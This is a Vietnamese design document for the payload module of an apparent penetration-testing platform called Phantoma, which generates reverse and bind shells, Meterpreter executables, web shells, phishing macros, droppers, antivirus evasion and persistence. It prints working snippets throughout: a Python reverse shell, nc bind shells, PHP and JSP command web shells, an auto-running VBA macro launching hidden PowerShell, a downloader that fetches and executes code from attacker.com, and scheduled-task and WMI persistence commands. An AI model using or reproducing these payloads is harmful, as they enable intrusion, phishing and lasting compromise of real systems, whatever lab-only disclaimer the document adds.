# 💉 Phantoma PAYLOAD — Tài Liệu Module Tạo Mã Độc

> **Phiên bản:** 1.0.0  
> **Module:** Payload Generation, Encoding & Anti‑Virus Evasion  
> **Nền tảng:** Phantoma — Hệ Sinh Thái An Ninh Mạng Tự Động Hóa  

---

## 📑 Mục Lục

- [1. Tổng Quan Kiến Trúc](#1-tổng-quan-kiến-trúc)
- [2. Reverse Shell & Bind Shell](#2-reverse-shell--bind-shell)
- [3. Meterpreter Payload (Metasploit)](#3-meterpreter-payload-metasploit)
- [4. Web Shell (PHP, ASP, JSP)](#4-web-shell-php-asp-jsp)
- [5. Document Macro (Phishing)](#5-document-macro-phishing)
- [6. Dropper & Downloader](#6-dropper--downloader)
- [7. Anti‑Virus Evasion (Encoding & Packing)](#7-anti-virus-evasion-encoding--packing)
- [8. Persistence Mechanisms](#8-persistence-mechanisms)
- [9. Cơ Chế An Toàn & Giới Hạn](#9-cơ-chế-an-toàn--giới-hạn)
- [10. Luồng Dữ Liệu & API](#10-luồng-dữ-liệu--api)
- [11. Hướng Dẫn Phát Triển](#11-hướng-dẫn-phát-triển)

---

## 1. Tổng Quan Kiến Trúc

Module **PAYLOAD** cung cấp giao diện để tạo, mã hóa và tùy chỉnh payload với nhiều định dạng (exe, elf, apk, macro, web shell). Backend gọi `msfvenom`, các script tùy chỉnh, và công cụ mã hóa.

```
PAYLOAD/
├── PAYLOAD.md                   ← Tài liệu này
├── index.tsx                    ← Component chính
├── Shell/                       ← Reverse / Bind shell
│   ├── ReverseShellBuilder.tsx
│   ├── BindShellBuilder.tsx
│   ├── SupportedLanguages.ts (bash, python, powershell, nc, php, perl)
│   └── ...
├── Meterpreter/                 ← Metasploit payloads
│   ├── MSFVenomGUI.tsx
│   ├── PayloadSelector.tsx
│   ├── EncoderSelector.tsx
│   └── ...
├── WebShell/                    ← Web shell
│   ├── PHPShellBuilder.tsx
│   ├── ASPBuilder.tsx
│   ├── JSPBuilder.tsx
│   └── ...
├── Macro/                       ← Macro (phishing)
│   ├── VBAEditor.tsx
│   ├── TemplateSelector.tsx
│   └── ...
├── Dropper/                     ← Dropper / Downloader
│   ├── DownloaderBuilder.tsx
│   ├── StagedPayload.tsx
│   └── ...
├── Evasion/                     ← Bypass AV
│   ├── EncoderList.tsx
│   ├── CustomObfuscator.tsx
│   ├── PackerSelector.tsx
│   └── ...
├── Persistence/                 ← Duy trì truy cập
│   ├── RegistryPersist.tsx
│   ├── WMIEventPersist.tsx
│   ├── ScheduledTask.tsx
│   └── ...
├── services/                    (msfvenom, obfuscator, upx, hyperion)
├── types/
└── utils/
```

### 🎯 Các loại payload chính

| # | Loại | Mô tả |
|---|------|-------|
| 1 | Reverse Shell | Kết nối ngược về attacker (TCP, HTTP, HTTPS, DNS) |
| 2 | Bind Shell | Mở cổng chờ kết nối |
| 3 | Meterpreter | Metasploit agent, nhiều tính năng |
| 4 | Web Shell | PHP, ASP, JSP, ASPX file upload |
| 5 | Macro | VBA macro trong Office (phishing) |
| 6 | Dropper | Tải payload từ xa, staged |
| 7 | Evasion | Encoder, packer, obfuscator (bypass AV) |
| 8 | Persistence | Tự khởi động sau reboot |

---

## 2. Reverse Shell & Bind Shell

### 2.1 Reverse Shell (TCP)

| Tham số | Kiểu | Mô tả |
|---------|------|-------|
| `lhost` | `string` | IP của listener (attacker) |
| `lport` | `number` | Cổng listener |
| `language` | `string` | `bash` / `python` / `powershell` / `nc` / `php` / `perl` |
| `platform` | `string` | `linux` / `windows` / `macos` |

**Ví dụ output (Python):**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.100",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Component:** `Shell/ReverseShellBuilder.tsx` – sinh code theo các language, có nút copy.

### 2.2 Bind Shell

| Tham số | Kiểu | Mô tả |
|---------|------|-------|
| `bindPort` | `number` | Cổng mở để chờ kết nối |
| `language` | `string` | Như trên |

**Ví dụ (netcat):** `nc -lvp 4444 -e /bin/sh` (Linux) hoặc `nc -lvp 4444 -e cmd.exe` (Windows – nếu có nc).

### 2.3 Reverse Shell qua HTTPS (PowerShell)

- Sử dụng `Invoke-WebRequest` để tải và thực thi.
- Mã hóa base64 để tránh phát hiện.

---

## 3. Meterpreter Payload (Metasploit)

### 3.1 MSFVenom Wrapper

| Tham số | Kiểu | Mô tả |
|---------|------|-------|
| `payload` | `string` | `windows/meterpreter/reverse_tcp`, `linux/x64/meterpreter/reverse_tcp`, `android/meterpreter/reverse_tcp` |
| `lhost` | `string` | IP listener |
| `lport` | `number` | Port |
| `format` | `string` | `exe`, `elf`, `apk`, `ps1`, `raw`, `c` |
| `encoder` | `string` | `x86/shikata_ga_nai`, `x64/xor` |
| `iterations` | `number` | Số lần encode |
| `template` | `string?` | Template exe hợp lệ (để giấu) |
| `inject` | `boolean` | Inject vào process khác (thường không dùng) |

**Lệnh mẫu:** 
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```

**Output:** File tải về, kèm hash (MD5, SHA256) để so sánh.

**Component:** `Meterpreter/MSFVenomGUI.tsx` – chọn payload, encoder, nhập thông số, nút "Generate".

### 3.2 Multi‑Handler Listener (Metasploit) – hỗ trợ

- Tạo file `.rc` để tự động start listener.

---

## 4. Web Shell (PHP, ASP, JSP)

### 4.1 PHP Web Shell

| Loại | Mô tả |
|------|-------|
| Simple shell | `<?php system($_GET['cmd']); ?>` |
| One‑liner | `<?= @eval($_POST['pass']);` (cần China Chopper) |
| Encoded | Obfuscated, hidden (base64, gzip) |

**Component:** `WebShell/PHPShellBuilder.tsx` – cho phép chọn tính năng (file manager, upload, reverse shell).

**Ví dụ output (full featured):** 
```php
<?php
if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); }
if(isset($_FILES['file'])){ move_uploaded_file(...); }
?>
```

### 4.2 ASP / ASPX Shell

- Tương tự, dùng `eval` hoặc `Process.Start`.

### 4.3 JSP Shell

- `Runtime.getRuntime().exec(request.getParameter("cmd"));`

---

## 5. Document Macro (Phishing)

### 5.1 VBA Macro cho Excel/Word

| Thành phần | Mô tả |
|-----------|-------|
| `AutoOpen()` / `Workbook_Open()` | Tự động chạy khi mở |
| `Shell()` | Chạy lệnh PowerShell / cmd |
| `CreateObject("WScript.Shell")` | Thực thi |
| `Base64 encoded` | Mã hóa payload |

**Ví dụ macro tải reverse shell:**
```vb
Sub AutoOpen()
    Dim s As String
    s = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKAA..."
    CreateObject("WScript.Shell").Run s, 0, False
End Sub
```

**Component:** `Macro/VBAEditor.tsx` – sinh code, nhúng payload, xuất file `.docm`.

### 5.2 Template Injection

- Nhúng macro vào template (`Normal.dotm`).

---

## 6. Dropper & Downloader

### 6.1 Staged Payload (Small dropper)

- Dropper nhỏ (vài KB) tải payload chính từ URL.
- Tránh được AV dựa trên kích thước.

**Ví dụ (PowerShell):**
```powershell
$client = New-Object System.Net.WebClient
$payload = $client.DownloadString("http://attacker.com/payload.ps1")
Invoke-Expression $payload
```

### 6.2 HTA Dropper (HTML Application)

- File `.hta` chạy được cả trong Internet Explorer.

```html
<script>
    new ActiveXObject("WScript.Shell").Run("powershell -enc ...");
</script>
```

### 6.3 Executable Dropper (C++ / C#)

- Tạo exe đơn giản dùng `URLDownloadToFile` + `WinExec`.

---

## 7. Anti‑Virus Evasion (Encoding & Packing)

### 7.1 MSFVenom Encoders

| Encoder | Tỉ lệ bypass | Mô tả |
|---------|-------------|-------|
| `x86/shikata_ga_nai` | Trung bình | Polymorphic, tốt nhất của Metasploit |
| `x86/xor` | Thấp | XOR encoder |
| `x86/jmp_call_additive` | Thấp | Cổ điển |
| `x86/alpha_mixed` | Trung bình | Mã hóa thành alphanumeric |
| `x86/unicode_mixed` | Trung bình | Unicode |

**Lưu ý:** Encoder cũ của MSF hiện không bypass được AV hiện đại (chỉ bypass được signature cũ).

### 7.2 Custom Obfuscator

| Kỹ thuật | Mô tả |
|----------|-------|
| PowerShell: `Invoke-Obfuscation` | Obfuscate PS script |
| Python: `pyarmor`, `pyminifier` | Rối tung code |
| JS: `javascript-obfuscator` | Biến thành Unicode escape |
| C/C++: `LLVM obfuscator` | Thêm junk code, flatten control flow |

### 7.3 Packers

| Packer | Mô tả | Khả năng bypass |
|--------|-------|-----------------|
| UPX | Nén executable | Kém (AV nhận dạng) |
| Hyperion | XOR + AES encrypt | Tốt hơn UPX |
| Enigma | Commercial | Rất tốt |
| VMProtect | Virtualization | Tốt nhất (tốn tiền) |

**Component:** `Evasion/PackerSelector.tsx` – chọn packer, nút "Pack" (gọi UPX/Hyperion).

### 7.4 Custom Encryption (AES)

- Shellcode được mã hóa AES, khi chạy mới giải mã và thực thi.
- Có thể viết loader bằng C/PowerShell.

---

## 8. Persistence Mechanisms

### 8.1 Windows Registry (Run keys)

| Registry Key | Mô tả |
|--------------|-------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Chạy khi user logon |
| `HKLM\...\Run` | Chạy cho mọi user (cần admin) |
| `HKCU\...\RunOnce` | Chạy 1 lần |

**Component:** `Persistence/RegistryPersist.tsx` – sinh lệnh hoặc script để thêm key.

### 8.2 Scheduled Tasks

```cmd
schtasks /create /tn "UpdateTask" /tr "C:\path\payload.exe" /sc onlogon /ru "System"
```

### 8.3 WMI Event Subscription

```powershell
Register-WmiEvent -Query 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "explorer.exe"' -Action { Start-Process "payload.exe" }
```

### 8.4 Linux Persistence

- `~/.bashrc`, `~/.ssh/authorized_keys`, `systemd service`, `cron`.

---

## 9. Cơ Chế An Toàn & Giới Hạn

### 9.1 Yêu cầu ủy quyền

- Người dùng phải xác nhận "Tôi chỉ tạo payload để kiểm thử trên hệ thống của tôi hoặc được ủy quyền".
- Tất cả payload tạo ra đều được log (tên file, hash, thời gian).

### 9.2 Không tự động phân phối

- Module chỉ tạo payload, **không** gửi email, upload lên web, hoặc phân phối dưới bất kỳ hình thức nào.

### 9.3 Giới hạn tính năng

- Không hỗ trợ ransomware (mã hóa dữ liệu).
- Không hỗ trợ worm (tự lây lan).

### 9.4 Quét payload tạo ra

- Có thể tích hợp VirusTotal API để kiểm tra tỉ lệ phát hiện (nếu người dùng đồng ý).

---

## 10. Luồng Dữ Liệu & API

```
User → (chọn loại payload, nhập tham số) → Generate
   ↓
Backend: gọi msfvenom / custom script → tạo file
   ↓
Download file (hoặc xem code)
   ↓
Log vào workspace
```

### Endpoints dự kiến

| Method | Endpoint | Body | Mô tả |
|--------|----------|------|-------|
| POST | `/api/payload/shell/reverse` | `{ lhost, lport, language, platform }` | Sinh reverse shell code |
| POST | `/api/payload/shell/bind` | `{ bindPort, language, platform }` | Sinh bind shell code |
| POST | `/api/payload/msfvenom` | `{ payload, lhost, lport, format, encoder, iterations }` | Tạo Meterpreter payload |
| POST | `/api/payload/webshell/php` | `{ features[] }` | Sinh PHP shell |
| POST | `/api/payload/macro` | `{ payloadType, lhost, lport }` | Sinh VBA macro |
| POST | `/api/payload/evasion/obfuscate` | `{ inputFile, technique }` | Obfuscate script |
| GET | `/api/payload/download/{id}` | - | Tải file đã tạo |

---

## 11. Hướng Dẫn Phát Triển

### 11.1 Công Cụ Cần Cài Đặt

| Công cụ | Mục đích |
|---------|----------|
| `msfvenom` (Metasploit) | Meterpreter payload |
| `upx` | Packing |
| `invoke-obfuscation` | PowerShell obfuscation |
| `hypertion` | AES encryption (PE) |

### 11.2 Service Wrapper

| File | Mô tả |
|------|-------|
| `services/msfvenom.ts` | Gọi msfvenom, lưu output vào temp file |
| `services/shellCodeGen.ts` | Sinh reverse/bind shell code (không cần tool) |
| `services/obfuscator.ts` | Gọi các obfuscator tương ứng |
| `services/packer.ts` | UPX, Hyperion |

### 11.3 UI Components

- **PayloadSelector**: Chọn loại payload qua tabs hoặc accordion.
- **ParamForm**: Form động dựa trên loại payload.
- **CodePreview**: Hiển thị code (syntax highlighting) hoặc nút download.
- **VirusTotalButton**: Gửi file lên VT (nếu có API key).

### 11.4 Tích Hợp Với Module Khác

- **ATTACK**: Có thể sử dụng payload từ PAYLOAD để thực hiện khai thác.
- **POST**: Persistence script sinh ra có thể được POST triển khai.
- **REPORT**: Ghi lại payload đã tạo (tên, hash).

---

## 📊 Tổng Kết

| Chỉ số | Giá trị |
|--------|---------|
| **Số loại payload** | 8 (reverse shell, bind, meterpreter, web shell, macro, dropper, evasion, persistence) |
| **Hỗ trợ ngôn ngữ/format** | bash, python, powershell, php, perl, exe, elf, apk, ps1, vba, hta, docm |
| **Encoder hỗ trợ** | MSF encoders, custom obfuscators (PS, JS, Python) |
| **Packer hỗ trợ** | UPX, Hyperion |
| **Phạm vi** | Tạo payload, không phân phối |
| **Tích hợp AV check** | Tùy chọn (VirusTotal) |

> **Phantoma PAYLOAD v1.0.0** — *"Tạo vũ khí, nhưng chỉ dùng trong phòng thí nghiệm"* 🔧